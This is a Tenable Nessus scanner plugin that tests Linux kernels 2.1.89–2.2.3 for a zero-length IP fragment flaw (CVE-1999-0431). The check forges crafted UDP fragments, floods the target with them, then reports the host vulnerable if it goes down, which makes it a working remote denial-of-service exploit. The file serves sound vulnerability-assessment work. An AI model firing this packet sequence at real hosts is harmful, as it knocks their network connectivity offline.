#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10134);
 script_version("$Revision: 1.39 $");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");

 script_cve_id("CVE-1999-0431");
 script_bugtraq_id(2247);
 script_osvdb_id(5941);

 script_name(english:"Linux 2.1.89 - 2.2.3 IP Fragmenting Functionality 0 Length Fragment Handling Remote DoS");
 script_summary(english:"Disables networking connectivity on the remote host");

 script_set_attribute(attribute:"synopsis", value:"The remote host is prone to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using a Linux kernel that contains a
flaw in its IP fragment handling code. By sending a series of packets
with 0 length fragments, an unauthenticated attacker may be able to
disable the remote host's IP connectivity.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Mar/149");
 script_set_attribute(attribute:"solution", value:"Upgrade to Linux kernel version 2.2.4 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/03/24");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:linux:kernel");
 script_end_attributes();

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_dependencies("os_fingerprint.nasl");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if ( TARGET_IS_IPV6 ) exit(0);

os = get_kb_item("Host/OS");
if ( os && "Linux" >!< os ) exit(0);

if (report_paranoia < 2) audit(AUDIT_PARANOID);

start_denial();

# source port
s = 56;
# dest port
d = 16384;

ip = forge_ip_packet(ip_v : 4,
                     ip_hl: 5,
                     ip_tos:0,
                     ip_id : 0x1234,
                     ip_ttl: 0x40,
                     ip_p  : IPPROTO_UDP,
                     ip_len:  20 + 32,
		     ip_src: this_host(),
                     ip_off: IP_MF);
udp1 = forge_udp_packet(ip:ip, uh_sport:s, uh_dport:d, uh_ulen:56);

ip = set_ip_elements(ip : ip, ip_len : 20, ip_off : IP_MF);
udp2 = forge_udp_packet(ip:ip, uh_sport:s,uh_dport:d, uh_ulen:56,
                        update_ip_len:FALSE);
ip = set_ip_elements(ip : ip, ip_len:32 + 20,ip_off:4);
udp3 = forge_udp_packet(ip:ip, uh_sport:s,uh_dport:d,uh_ulen:56);

# don't read the host answers
send_packet(udp1,udp2, udp3, pcap_active:FALSE) x 1000;

sleep(30);

alive = end_denial();

if(!alive){
  set_kb_item(name:"Host/dead", value:TRUE);
  security_warning(port:0, protocol:"udp");
}
